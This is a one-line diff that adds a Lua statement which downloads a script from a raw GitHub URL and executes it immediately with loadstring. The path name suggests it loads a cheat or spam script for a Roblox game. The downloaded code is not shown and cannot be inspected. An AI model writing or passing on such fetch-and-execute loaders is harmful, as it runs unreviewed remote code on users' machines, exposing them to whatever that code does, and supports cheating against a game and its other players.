@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/new-mythic-hypershot-spam5-flo36z5yhhdvuv.lua"))()
